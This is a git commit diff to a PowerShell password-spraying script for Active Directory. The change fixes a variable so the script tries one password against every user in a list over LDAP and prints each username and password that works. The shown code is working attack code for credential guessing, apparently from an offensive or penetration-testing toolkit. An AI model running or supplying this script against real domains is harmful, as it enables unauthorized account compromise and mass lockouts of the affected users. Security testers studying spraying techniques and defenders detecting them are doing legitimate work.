bd1e48bf665cc53030ee1b53b3215ab9a72e0c00
ville87 <38942588+ville87@users.noreply.github.com>
2021-12-07 15:23:17 +0100

    Update powershell_pwspray.ps1

--- Windows/powershell_pwspray.ps1
+++ Windows/powershell_pwspray.ps1
@@ -5,7 +5,7 @@ $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
 $count = $UserList.count
 Write-Host "[*] Now trying password $password against $count users."
 foreach($user in $userlist){
-    $checkdomain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$pass)
+    $checkdomain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$password)
     if ($checkdomain.name -ne $null)
     {
         Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
